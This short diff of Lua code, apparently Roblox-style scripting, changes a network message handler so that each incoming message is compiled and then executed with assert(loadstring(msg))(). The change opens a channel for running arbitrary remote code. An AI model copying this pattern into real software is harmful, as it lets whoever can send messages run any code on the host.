@@ -19,7 +19,7 @@ end
 
 web.OnMessage:Connect(function(msg)
     s,e = pcall(function()
-        loadstring(msg)
+       assert(loadstring(msg))()
     end)
     if not s then
     error(e)
